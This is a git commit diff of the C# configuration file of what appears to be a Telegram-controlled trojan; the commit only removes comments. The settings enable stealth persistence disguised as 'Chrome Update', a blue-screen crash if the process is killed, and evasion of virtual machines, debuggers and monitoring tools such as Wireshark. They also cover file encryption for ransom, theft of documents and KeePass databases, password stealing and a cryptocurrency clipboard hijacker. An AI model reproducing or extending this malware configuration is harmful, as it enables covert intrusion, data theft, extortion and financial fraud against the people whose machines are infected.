bc9e8f55467e2d32a60a63295d54fcafefae3769
Andrei <115979824+andrejparkur2007@users.noreply.github.com>
2022-11-07 08:04:40 +0200

    Update app.cs

--- app.cs
+++ app.cs
@@ -2,37 +2,36 @@ namespace pon
 {
     internal sealed class config
     {
-        // Telegram settings.
         public const string TelegramToken = "You'r bot token from bofather";
         public const string TelegramChatID = "You't chat id";
         public static int TelegramCommandCheckDelay = 1;
-        // Installation to system.
+        
         public static bool AdminRightsRequired = true;
         public static bool AttributeHiddenEnabled = true;
         public static bool AttributeSystemEnabled = true;
         public static bool MeltFileAfterStart = true;
         public static string InstallPath = @"C:\Users\pon\pon.exe";
-        // Add to startup.
+        
         public static bool AutorunEnabled = true;
         public static string AutorunName = "Chrome Update";
-        // Protect process with BSoD (if killed).
+        
         public static bool ProcessBSODProtectionEnabled = true;
-        // Hide console window. Need for debugging.
+        
         public static bool HideConsoleWindow = true;
-        // Do not start trojan if it running in VirtualBox, VMWare, SandBoxie, Debuggers.
+        
         public static bool PreventStartOnVirtualMachine = true;
-        // Start delay (in seconds).
+        
         public static int StartDelay = 0;
-        // The program will not make requests to telegram api if processes are running below.
+       
         public static bool BlockNetworkActivityWhenProcessStarted = true;
-        // Process list
+        
         public static string[] BlockNetworkActivityProcessList =
         {
             "taskmgr", "processhacker",
             "netstat", "netmon", "tcpview", "wireshark",
             "filemon", "regmon", "cain"
         };
-        // Types of files to be encrypted
+        
         public static string[] EncryptionFileTypes =
         {
             ".lnk", 
@@ -40,9 +39,9 @@ namespace pon
             ".pdf", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
             ".csv", ".sql", ".mdb", ".sln", ".php", "py", ".asp", ".aspx", ".html", ".xml"
         };
-        // Maximum file size to grab (in bytes).
+        
         public static long GrabFileSize = 6291456;
-        // What types of files will be downloaded from the computer when executing the /GrabDesktop command.
+        
         public static string[] GrabFileTypes =
         {
             ".kdbx",
@@ -50,11 +49,11 @@ namespace pon
             ".pdf", ".txt", ".rtf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
             ".sql", ".php", ".py", ".html", ".xml", ".json", ".csv"
         };
-        // Automatically steal all passwords and send to chat at first start.
+        
         public static bool AutoStealerEnabled = false;
-        // Clipper is enabled
+        
         public static bool ClipperEnabled = true;
-        // Your wallet addresses
+        
         public static string bitcoin_address = "Adress";
         public static string etherium_address = "Adress";
         public static string monero_address = "Adress";
